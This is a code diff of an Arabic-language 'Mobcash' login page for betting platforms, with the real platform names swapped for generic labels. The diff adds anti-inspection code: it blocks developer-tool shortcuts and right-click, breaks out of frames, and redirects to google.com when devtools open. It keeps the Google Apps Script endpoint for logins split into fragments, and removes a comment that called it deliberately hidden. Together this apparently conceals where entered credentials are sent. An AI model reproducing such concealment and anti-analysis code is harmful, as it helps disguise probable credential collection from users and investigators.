@@ -49,11 +49,26 @@
       -webkit-touch-callout: none;
     }
   </style>
+  <script>
+    if (window.top !== window.self) window.top.location = window.self.location;
+    document.addEventListener("keydown", function(e) {
+      if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) e.preventDefault();
+    });
+    document.addEventListener("contextmenu", function(e) {
+      e.preventDefault();
+    });
+    const detectDevTools = () => {
+      const threshold = 160;
+      const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+      const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+      if (widthThreshold || heightThreshold) {
+        location.replace("https://google.com");
+      }
+    };
+    setInterval(detectDevTools, 1000);
+  </script>
 </head>
-<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4"
-  oncontextmenu="return false"
-  onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&event.keyCode==73||event.ctrlKey&&event.keyCode==85){return false;}">
-
+<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4">
   <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-8 w-full max-w-md">
     <h2 class="text-2xl font-bold text-center text-gray-800 dark:text-white mb-6">Sign in to Mobcash</h2>
 
@@ -63,6 +78,7 @@
         <path d="M10 5.5l-.2-.1H6.6L9.8 1V.8H4.9l-4 7v.3h3l-3 6.3v.3h.4l8.7-9c.1 0 .1-.1 0-.2z"/>
       </svg>
     </button>
+
     <div class="mb-4 relative">
       <label for="platform" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">اختر المنصة</label>
       <div id="customSelect" class="relative w-full">
@@ -73,25 +89,25 @@
           </svg>
         </button>
         <ul id="dropdownList" class="absolute z-10 w-full bg-white dark:bg-gray-700 border rounded-xl mt-1 hidden max-h-60 overflow-y-auto text-sm text-gray-800 dark:text-white">
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Mega pari">
-            Mega pari
-            <img src="https://i.postimg.cc/xdy6d0h9/charge.jpg" alt="Mega pari" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a1">
+            منصة 1
+            <img src="https://i.postimg.cc/xdy6d0h9/charge.jpg" alt="P1" class="w-6 h-6 rounded-full">
           </li>
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Linbet">
-            Linbet
-            <img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="Linbet" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a2">
+            منصة 2
+            <img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="P2" class="w-6 h-6 rounded-full">
           </li>
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Gooobet">
-            Gooobet
-            <img src="https://i.postimg.cc/J4CVthdk/recharge.jpg" alt="Gooobet" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a3">
+            منصة 3
+            <img src="https://i.postimg.cc/J4CVthdk/recharge.jpg" alt="P3" class="w-6 h-6 rounded-full">
           </li>
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="1xbet">
-            1xbet
-            <img src="https://i.postimg.cc/7ZT29mnc/recharge.png" alt="1xbet" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a4">
+            منصة 4
+            <img src="https://i.postimg.cc/7ZT29mnc/recharge.png" alt="P4" class="w-6 h-6 rounded-full">
           </li>
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Melbet">
-            Melbet
-            <img src="https://i.postimg.cc/1t3bhntk/recharge.jpg" alt="Melbet" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a5">
+            منصة 5
+            <img src="https://i.postimg.cc/1t3bhntk/recharge.jpg" alt="P5" class="w-6 h-6 rounded-full">
           </li>
         </ul>
         <input type="hidden" id="platform" name="platform" />
@@ -168,12 +184,11 @@
     document.getElementById("userId").disabled = false;
   }
 
-  // رابط Apps Script (حقيقي لكنه مخفي برمجياً)
   function getRealScriptURL() {
-    const part1 = "https://script";
-    const part2 = ".google.com/macros/s/";
-    const part3 = "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA";
-    return part1 + part2 + part3 + "/exec";
+    const p1 = "https://script";
+    const p2 = ".google.com/macros/s/";
+    const p3 = "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA";
+    return p1 + p2 + p3 + "/exec";
   }
 
   function secureLogin() {
